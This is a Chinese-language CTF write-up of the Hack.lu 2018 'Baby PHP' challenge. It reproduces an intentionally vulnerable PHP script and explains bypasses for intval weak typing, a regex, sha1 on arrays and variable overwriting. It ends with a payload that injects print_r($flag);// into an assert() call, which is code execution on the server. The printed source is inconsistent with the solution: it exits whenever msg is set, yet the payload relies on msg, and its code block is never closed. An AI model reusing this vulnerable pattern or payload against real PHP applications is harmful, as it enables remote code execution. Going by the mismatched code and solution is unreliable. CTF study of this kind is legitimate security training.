---
title: Hack.lu 2018 Baby PHP
categories: CTF Web
tags: PHP 变量覆盖 assert sha1绕过
---

# Hack.lu 2018 Baby PHP
## 题目信息
平台：CTFHub
考点：PHP伪协议、intval弱类型、正则匹配、数组sha1绕过、变量覆盖、assert代码执行

## 源码分析
```php
<?php
require_once('flag.php');
error_reporting(0);

if(isset($_GET['msg'])){
    highlight_file(__FILE__);
    die();
}
@$msg = $_GET['msg'];
if(@file_get_contents($msg)!=="Hello Challenge!"){
    die('Wow so rude!!!!1');
}
echo "Hello Hacker! Have a look around.\n";

@$k1=$_GET['key1'];
@$k2=$_GET['key2'];
$cc = 1337;$bb = 42;

if(intval($k1) !== $cc || $k1 === $cc){
    die("lol no\n");
}

if(strlen($k2) == $bb){
    if(preg_match('/^\d+＄/', $k2) && !is_numeric($k2)){
        if($k2 == $cc){
            @$cc = $_GET['cc'];
        }
    }
}

list($k1,$k2) = [$k2, $k1];

if(substr($cc, $bb) === sha1($cc)){
    foreach ($_GET as $lel => $hack){
        $$lel = $hack;
    }
}

if($$a !== $k1){
    die("lel no\n");
}

assert_options(ASSERT_BAIL, 1);
assert("$bb = $cc");
echo "Good Job ;)";
// TODO echo $flag;
解题思路

1. msg参数：file_get_contents()读取内容需要等于Hello Challenge!，使用data://伪协议传入内容。

2. key1弱类型：要求intval($k1)=1337但是$k1!==1337，使用1337e0。

3. key2构造：

◦ 字符串长度必须等于42

◦ 正则匹配：^\d+＄，末尾是全角＄

◦ !is_numeric()，弱比较等于1337
构造：1337＄aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

4. sha1数组绕过：sha1()处理数组返回NULL，substr处理数组同样返回NULL，NULL===NULL成立，触发变量覆盖。

5. 变量覆盖：foreach($_GET as $lel=>$hack) $$lel=$hack，覆盖变量。

6. assert代码注入：利用//注释掉后面的==$cc，执行print_r($flag)读取flag。

Payload
msg=data://text/plain,Hello Challenge!
key1=1337e0
key2=1337＄aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cc[]=
a=k1
bb=print_r($flag);//
Flag

ctfhub{1cc8dfbac980e6ea68ec57aa}